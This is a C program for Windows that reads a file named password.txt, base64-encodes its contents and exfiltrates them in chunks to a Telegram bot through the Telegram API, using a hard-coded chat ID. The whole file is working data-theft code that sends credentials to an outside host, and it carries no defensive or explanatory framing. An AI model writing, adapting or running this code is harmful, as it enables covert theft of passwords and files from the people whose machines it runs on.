#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_TG_MSG_SIZE 3200 // by limit 4096

const char* CHAT_ID = "5547299598";
const wchar_t* HOST = L"api.telegram.org";
const wchar_t* TOKEN = L"bot<MY_TOKEN>";  // my token

// send text to Telegram
int sendToTgBot(const char* message) {
  HINTERNET hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
  if (!hSession) return 1;

  HINTERNET hConnect = WinHttpConnect(hSession, HOST, INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (!hConnect) { WinHttpCloseHandle(hSession); return 1; }

  wchar_t path[512];
  swprintf(path, 512, L"/%s/sendMessage", TOKEN);

  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path, NULL, WINHTTP_NO_REFERER, NULL, WINHTTP_FLAG_SECURE);
  if (!hRequest) {
    WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return 1;
  }

  char body[4096];
  snprintf(body, sizeof(body), "chat_id=%s&text=%s", CHAT_ID, message);

  BOOL result = WinHttpSendRequest(hRequest,
    L"Content-Type: application/x-www-form-urlencoded\r\n",
    -1, body, strlen(body), strlen(body), 0);

  if (!result) {
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return 1;
  }

  WinHttpReceiveResponse(hRequest, NULL);

  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);
  return 0;
}

// encoding base64
char* base64_encode(const BYTE* buffer, DWORD length) {
  DWORD base64Len = 0;
  CryptBinaryToStringA(buffer, length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64Len);
  char* base64 = (char*)malloc(base64Len + 1);
  CryptBinaryToStringA(buffer, length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64, &base64Len);
  base64[base64Len] = '\0';
  return base64;
}

// base64 fs
void sendBase64File(const char* filePath) {
  FILE* f = fopen(filePath, "rb");
  if (!f) {
    perror("fopen");
    return;
  }

  fseek(f, 0, SEEK_END);
  long size = ftell(f);
  rewind(f);

  BYTE* data = malloc(size);
  fread(data, 1, size, f);
  fclose(f);

  char* encoded = base64_encode(data, size);
  free(data);

  size_t len = strlen(encoded);
  printf("[*] Sending base64-encoded data (%zu bytes)...\n", len);
  for (size_t i = 0; i < len; i += MAX_TG_MSG_SIZE) {
    char chunk[4096] = {0};
    strncpy(chunk, encoded + i, MAX_TG_MSG_SIZE);
    sendToTgBot(chunk);
    Sleep(1000); // sleep
  }

  free(encoded);
  printf("[+] Done.\n");
}

int main() {
  const char* filePath = "password.txt";
  sendBase64File(filePath);
  return 0;
}
